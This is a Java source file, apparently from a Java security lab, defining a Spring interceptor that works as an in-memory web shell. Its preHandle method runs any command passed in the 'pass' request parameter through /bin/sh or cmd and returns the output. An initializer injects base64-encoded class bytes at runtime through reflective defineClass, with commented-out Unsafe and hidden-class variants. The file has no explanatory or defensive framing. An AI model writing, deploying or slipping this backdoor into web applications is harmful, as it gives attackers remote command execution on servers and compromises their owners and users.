package org.joychou.controller;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.invoke.MethodHandles;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Scanner;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Controller;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;


@Controller
public class DynamicInterceptorTemplate0 extends HandlerInterceptorAdapter {
    private Class myClassLoaderClazz;
    private String basicCmdShellPwd = "pass";

    public DynamicInterceptorTemplate0() {
        this.initialize();
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("[+] Dynamic Interceptor0 says hello");
        String k;
        if (request.getParameter("type") != null && request.getParameter("type").equals("basic")) {
            k = request.getParameter(this.basicCmdShellPwd);
            if (k != null && !k.isEmpty()) {
                String[] cmds;
                if (File.separator.equals("/")) {
                    cmds = new String[]{"/bin/sh", "-c", k};
                } else {
                    cmds = new String[]{"cmd", "/C", k};
                }

                String result = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A").next();
                response.getWriter().println(result);
                return false;
            }
        }

        return true;
    }

    private void initialize() {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();

            try {
                this.myClassLoaderClazz = classLoader.loadClass("org.joychou.controller.MyClassLoader");
            } catch (ClassNotFoundException var8) {
                String code = "";
                byte[] bytes = java.util.Base64.getDecoder().decode(code);    // from base64 string to class bytes
//                Method method = null;
//
//                try {
//                    method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
//                    method.setAccessible(true);
//                    this.myClassLoaderClazz = (Class)method.invoke(classLoader, bytes, 0, bytes.length);
//                } catch (NoSuchMethodException var7) {
//                    var7.printStackTrace();
//                }

//                this.myClassLoaderClazz = sun.misc.Unsafe.getUnsafe().defineClass("com.feihong.ldap.template.MyClassLoader",bytes, 0, bytes.length );
//                System.out.println("[*] java.lang.invoke.MethodHandles.lookup().defineHiddenClass");
                System.out.println("[*] DynamicInterceptorTemplate0: java.lang.invoke.MethodHandles.lookup().defineClass(bytes);");
//                this.myClassLoaderClazz = java.lang.invoke.MethodHandles.lookup().defineClass(bytes);
                MethodHandles.Lookup lookup = java.lang.invoke.MethodHandles.lookup();
                Method method = MethodHandles.Lookup.class.getMethod("defineClass", byte[].class);
                this.myClassLoaderClazz = (Class) method.invoke(lookup, bytes);
//                java.lang.invoke.MethodHandles.lookup().defineHiddenClass(bytes, true, java.lang.invoke.MethodHandles.Lookup.ClassOption.NESTMATE);
                // ref: https://stackoverflow.com/questions/66974846/java-lang-exceptionininitializererror-with-java-16-j-l-classformaterror-access/67006749#67006749
            }
        } catch (IllegalAccessException | NoSuchMethodException | InvocationTargetException var9) {
            var9.printStackTrace();
        }

    }

    public static void main(String[] args) {
    }
}